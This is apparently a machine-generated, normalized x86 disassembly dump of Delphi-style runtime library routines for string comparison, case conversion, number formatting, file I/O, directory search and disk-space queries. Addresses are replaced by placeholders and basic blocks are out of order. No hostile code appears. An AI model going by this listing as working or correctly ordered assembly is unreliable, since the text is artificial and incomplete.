mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_3a62efc
call ebx
pop ebx
retn
sub_3a691b0
push ebx
mov ebx eax
mov eax 0xc
call sub_3a62ee0
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_3a69184
pop ebx
retn
sub_3a691e8
push ebx
push edi
push esi
test eax eax
mov esi eax
mov edi edx
mov eax edx
je r-xdata
pop esi
pop edi
pop ebx
jmp sub_3a652a0
mov edx [ esi - 0x4 ]
test edx edx
je r-xdata
mov ebx edx
call sub_3a659c0
mov edi [ edi ]
mov eax [ ebx + esi - 0x4 ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x7b7b7b7b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
sub ecx eax
mov [ ebx + edi - 0x4 ] ecx
sub ebx 0x1
and ebx 0xfffffffc
jmp r-xdata
sub ebx 0x4
jae r-xdata
mov eax [ ebx + esi ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x7b7b7b7b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
sub ecx eax
mov [ ebx + edi ] ecx
pop esi
pop edi
pop ebx
retn
sub_3a69270
push ebx
push edi
push esi
test eax eax
mov esi eax
mov edi edx
mov eax edx
je r-xdata
pop esi
pop edi
pop ebx
jmp sub_3a652a0
mov edx [ esi - 0x4 ]
test edx edx
je r-xdata
mov ebx edx
call sub_3a659c0
mov edi [ edi ]
mov eax [ ebx + esi - 0x4 ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x5b5b5b5b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
add ecx eax
mov [ ebx + edi - 0x4 ] ecx
sub ebx 0x1
and ebx 0xfffffffc
jmp r-xdata
sub ebx 0x4
jae r-xdata
mov eax [ ebx + esi ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x5b5b5b5b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
add ecx eax
mov [ ebx + edi ] ecx
pop esi
pop edi
pop ebx
retn
sub_3a692f8
cmp eax edx
je r-xdata
xor eax eax
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
movzx ecx [ edx ]
cmp cl [ eax ]
je r-xdata
sub eax [ edx - 0x4 ]
retn
test edx edx
jne r-xdata
push ebx
mov ebx [ eax - 0x4 ]
xor ecx ecx
sub ebx [ edx - 0x4 ]
push ebx
adc ecx 0xffffffff
and ecx ebx
sub ecx [ eax - 0x4 ]
sub eax ecx
sub edx ecx
movzx eax [ eax ]
sub eax ecx
retn
mov eax [ eax - 0x4 ]
retn
bsf ebx ebx
shr ebx 0x3
add ecx ebx
jns r-xdata
add ecx 0x4
js r-xdata
pop eax
pop ebx
retn
movzx eax [ ecx + eax ]
movzx edx [ ecx + edx ]
sub eax edx
pop ebx
pop ebx
retn
mov ebx [ ecx + eax ]
xor ebx [ ecx + edx ]
jne r-xdata
sub_3a69360
add eax ecx
add edx ecx
xor ecx 0xffffffff
add eax 0xfffffff8
add edx 0xfffffff8
add ecx 0x9
push ebx
jg r-xdata
cmp ecx 0x4
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
cmp ecx 0x6
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
xor eax eax
pop ebx
retn
lea ebx [ ecx + eax ]
add ecx 0x4
and ebx 0x3
sub ecx ebx
jg r-xdata
cmp ecx 0x7
jg r-xdata
movzx ebx [ ecx + eax ]
cmp bx [ ecx + edx ]
jne r-xdata
add ecx 0x4
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov eax 0x1
pop ebx
retn
movzx ebx [ eax + 0x7 ]
cmp bl [ edx + 0x7 ]
jne r-xdata
add ecx 0x2
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jle r-xdata
sub_3a693f4
test eax eax
jne r-xdata
test edx edx
jne r-xdata
test edx edx
je r-xdata
push ebx
push ebp
push esi
mov ebp [ eax - 0x4 ]
mov ebx [ edx - 0x4 ]
sub ebp ebx
sbb ecx ecx
and ecx ebp
add ecx ebx
lea esi [ ecx + eax ]
add edx ecx
neg ecx
je r-xdata
mov eax [ eax - 0x4 ]
retn
retn
mov eax [ edx - 0x4 ]
neg eax
mov eax ebp
movzx eax [ ecx + esi ]
movzx ebx [ ecx + edx ]
cmp eax ebx
je r-xdata
add ecx 0x2
jl r-xdata
cmp al bl
je r-xdata
shr eax 0x8
shr ebx 0x8
cmp al 0x61
jl r-xdata
mov ah 0x0
mov bh 0x0
cmp al 0x61
jl r-xdata
cmp bl 0x61
jl r-xdata
cmp al 0x7a
jg r-xdata
cmp bl 0x61
jl r-xdata
cmp al 0x7a
jg r-xdata
sub eax ebx
jne r-xdata
cmp bl 0x7a
jg r-xdata
sub eax 0x20
sub eax ebx
jne r-xdata
cmp bl 0x7a
jg r-xdata
sub eax 0x20
pop esi
pop ebp
pop ebx
retn
sub ebx 0x20
movzx eax [ ecx + esi ]
movzx ebx [ ecx + edx ]
cmp ah bh
je r-xdata
sub ebx 0x20
sub_3a69490
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_3a693f4
test eax eax
jne r-xdata
sub_3a694b4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_3a65730
mov edx eax
mov eax edi
mov ecx ebx
call sub_3a65390
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_3a694ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_3a65730
mov edx eax
mov eax edi
mov ecx ebx
call sub_3a65390
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_3a69524
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_3a65730
push eax
push ebx
mov eax edi
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop ebp
pop edi
pop esi
pop ebx
retn
sub esi 0x4
mov esi [ esi ]
sub_3a69568
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_3a69588
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
test eax eax
je r-xdata
mov esi eax
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_3a652a0
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_3a65798
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a695dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_3a69743
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
mov edx edi
mov eax edx
test eax eax
je r-xdata
lea esi [ eax + ebx ]
mov eax edx
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
cmp esi ebx
jbe r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_3a65498
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
movzx eax [ ebx ]
sub al 0xa
je r-xdata
cmp eax [ ebp - 0xc ]
jne r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub al 0x3
je r-xdata
mov ebx edi
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_3a65390
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx edi
call sub_3a652f4
jmp r-xdata
inc ebx
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6974a
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
movzx eax [ ebx ]
sub al 0xa
je r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
movzx eax [ ebx ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub al 0x3
je r-xdata
dec [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
call sub_3a6dfa0
mov ebx eax
jmp r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
jmp r-xdata
mov [ edi ] 0xd
inc edi
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
cmp esi ebx
ja r-xdata
cmp esi ebx
ja r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
cmp [ ebx ] 0xa
jne r-xdata
mov [ edi ] 0xd
inc edi
movzx eax [ ebx ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
jmp r-xdata
movzx eax [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov eax ebx
call sub_3a6df80
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax ebx
mov ecx [ ebp - 0x10 ]
call sub_3a63154
mov eax [ ebp - 0x10 ]
add edi eax
mov eax [ ebp - 0x10 ]
add ebx eax
jmp r-xdata
sub_3a69754
push esi
push edi
mov edi eax
xor eax eax
mov esi edi
mov ecx esi
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
sub ecx 0x4
mov ecx [ ecx ]
movzx ecx [ edi ]
add cl 0xbf
sub cl 0x1a
jb r-xdata
mov cl 0x1
jmp r-xdata
mov cl 0x1
sub cl 0x4
je r-xdata
test cl cl
jne r-xdata
pop edi
pop esi
retn
test dl dl
je r-xdata
add cl 0xfe
sub cl 0x1a
jb r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx esi
test edx edx
je r-xdata
xor ecx ecx
jmp r-xdata
sub edx 0x2
jl r-xdata
sub edx 0x4
mov edx [ edx ]
sub edx 0x2
jl r-xdata
sub edx 0x4
mov edx [ edx ]
xor cl 0x1
mov al 0x1
inc edx
mov esi 0x2
inc edx
mov esi 0x2
inc esi
dec edx
jne r-xdata
add cl 0xf9
sub cl 0x1a
jb r-xdata
inc esi
dec edx
jne r-xdata
add cl 0xfe
sub cl 0xa
jb r-xdata
movzx ecx [ edi + esi - 0x1 ]
add cl 0xd0
sub cl 0xa
jb r-xdata
sub cl 0x4
je r-xdata
movzx ecx [ edi + esi - 0x1 ]
sub cl 0x2e
je r-xdata
jmp r-xdata
add cl 0xf9
sub cl 0x1a
jb r-xdata
add cl 0xfe
sub cl 0x1a
jae r-xdata
sub cl 0x4
je r-xdata
add cl 0xfe
sub cl 0x1a
jae r-xdata
sub_3a69820
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_3a69836
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_3a69836
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_3a69836
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_3a6986c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_3a69820
mov edx esi
pop eax
call sub_3a65390
add esp 0x10
pop esi
retn
sub_3a6988c
or cl cl
jne sub_3a698c0
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_3a698c0
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_3a698c0
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_3a698c0
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_3a69958
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_3a6988c
mov edx esi
pop eax
call sub_3a65390
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_3a69980
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_3a69820
mov edx esi
pop eax
call sub_3a65390
add esp 0x20
pop esi
retn
xor edx edx
sub_3a699a8
push ebp
mov ebp esp
cmp eax 0x20
jle r-xdata
push esi
mov esi esp
sub esp 0x20
mov ecx 0x10
push edx
mov edx eax
lea eax [ ebp + 0x8 ]
call sub_3a6988c
mov edx esi
pop eax
call sub_3a65390
add esp 0x20
pop esi
pop ebp
retn 0x8
xor eax eax
sub_3a699d8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_3a63bf4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_3a690d4
sub_3a69a2c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_3a63bf4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_3a69a4c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_3a661fc
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_3a69a6c
mov eax [ rw-data ]
call sub_3a66414
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_3a66414
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_3a652f4
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_3a652f4
sub_3a69afc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
test edx edx
jl r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov ebx eax
mov edi [ ebp - 0x14 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x14 ]
call sub_3a65730
push eax
push esi
mov eax [ ebp - 0x10 ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
sete al
test al al
je r-xdata
sub edi 0x4
mov edi [ edi ]
add ebx 0x4
dec [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
sub_3a69b80
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3a6aff8
mov edx eax
test dl dl
je r-xdata
call sub_3a69a6c
push ebp
mov eax [ rw-data ]
call sub_3a6641c
mov edx eax
mov eax [ rw-data ]
call sub_3a69afc
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_3a6641c
mov edx eax
mov eax [ rw-data ]
call sub_3a69afc
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_3a69c1c
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_3a652f4
call sub_3a69a6c
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_3a652f4
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_3a652f4
jmp r-xdata
pop esi
pop ebx
retn
sub_3a69c68
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_3a65730
push eax
call CreateFileA
sub_3a69cc0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_3a69cec
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_3a69d18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call GetLastError
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub_3a69d68
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
mov ebx eax
lea eax [ ebp - 0x140 ]
push eax
mov eax ebx
call sub_3a65730
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
xor eax eax
push eax
call FindClose
test [ ebp - 0x140 ] 0x10
sete al
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_3a69da8
push ebx
push esi
mov esi eax
mov eax esi
call sub_3a65730
push eax
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
call GetLastError
mov ebx eax
cmp ebx 0x2
je r-xdata
test al 0x10
sete al
pop esi
pop ebx
retn
xor eax eax
jmp r-xdata
cmp ebx 0x3
je r-xdata
pop esi
pop ebx
retn
cmp ebx 0x7b
je r-xdata
mov eax esi
call sub_3a69d68
test al al
jne r-xdata
mov al 0x1
sub_3a69df0
push ebx
mov ebx eax
mov eax ebx
call sub_3a65730
push eax
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop ebx
retn
test al 0x10
jne r-xdata
mov al 0x1
pop ebx
retn
sub_3a69e14
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x20 ]
and eax [ ebx + 0x18 ]
jne r-xdata
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileA
test eax eax
jne r-xdata
push esp
lea eax [ ebx + 0x34 ]
push eax
call FileTimeToLocalFileTime
push ebx
lea eax [ ebx + 0x2 ]
push eax
lea eax [ esp + 0x8 ]
push eax
call FileTimeToDosDateTime
mov eax [ ebx + 0x40 ]
xor edx edx
push edx
push eax
mov eax [ ebx + 0x3c ]
xor edx edx
mov edx eax
xor eax eax
or eax [ esp ]
or edx [ esp + 0x4 ]
add esp 0x8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x10 ] eax
lea eax [ ebx + 0x14 ]
lea edx [ ebx + 0x4c ]
mov ecx 0x104
call sub_3a65510
xor esi esi
call GetLastError
mov esi eax
jmp r-xdata
mov eax esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a69e98
push ebx
push esi
push edi
mov ebx ecx
mov edi eax
not edx
and edx 0x16
mov [ ebx + 0x18 ] edx
lea eax [ ebx + 0x20 ]
push eax
mov eax edi
call sub_3a65730
push eax
call FindFirstFileA
mov esi eax
mov [ ebx + 0x1c ] esi
cmp esi 0xffffffff
je r-xdata
call GetLastError
mov esi eax
mov eax ebx
call sub_3a69e14
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3a69f0c
jmp r-xdata
sub_3a69ee8
push ebx
mov ebx eax
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileA
test eax eax
je r-xdata
call GetLastError
pop ebx
retn
mov eax ebx
call sub_3a69e14
pop ebx
retn
sub_3a69f28
push ebx
push esi
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3a6dd34
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_3a69f5c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
test eax eax
je r-xdata
mov edi eax
mov eax ebx
call sub_3a65730
mov ebp eax
test edi edi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ebx [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_3a6a2f8
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_3a6dd34
cmp al 0x2
jne r-xdata
dec edi
sub_3a69fb0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_3a69f5c
mov esi eax
push edi
mov ecx esi
mov edx 0x1
mov eax ebx
call sub_3a65798
pop edi
pop esi
pop ebx
retn
sub_3a69fe4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_3a69f5c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_3a65798
pop edi
pop esi
pop ebx
retn
sub_3a6a01c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_3a69f5c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_3a652a0
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_3a65798
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a6a064
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_3a65730
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_3a65390
add esp 0x108
pop esi
pop ebx
retn
sub_3a6a0a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_3a661d8
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_3a661d8
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_3a6a120
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
mov edx eax
neg edx
add eax 0x1
and eax 0xfffffffe
mov cx [ eax ]
add eax 0x2
test cl ch
jne r-xdata
test cl cl
je r-xdata
lea eax [ edx + eax - 0x2 ]
retn
test ch ch
jne r-xdata
lea eax [ edx + eax - 0x1 ]
retn
sub_3a6a174
sub edx eax
test eax 0x1
push eax
je r-xdata
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
movzx ecx [ edx + eax ]
mov [ eax ] cl
test ecx ecx
je r-xdata
mov [ eax ] cl
pop eax
retn
movzx ecx [ edx + eax ]
mov [ eax ] cx
add eax 0x2
cmp ecx 0xff
ja r-xdata
pop eax
retn
inc eax
sub_3a6a1ac
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_3a6a1e0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx esi
test ebx ebx
je r-xdata
mov eax esi
call sub_3a65730
mov edx eax
mov ecx ebx
mov eax edi
call sub_3a6a1ac
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_3a6a208
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_3a65730
mov edx eax
mov ecx edi
mov eax ebx
call sub_3a6a1ac
pop edi
pop esi
pop ebx
retn
sub_3a6a228
sub edx eax
jne r-xdata
movzx ecx [ edx + eax ]
cmp cl [ eax ]
jne r-xdata
xor eax eax
retn
movzx eax [ eax ]
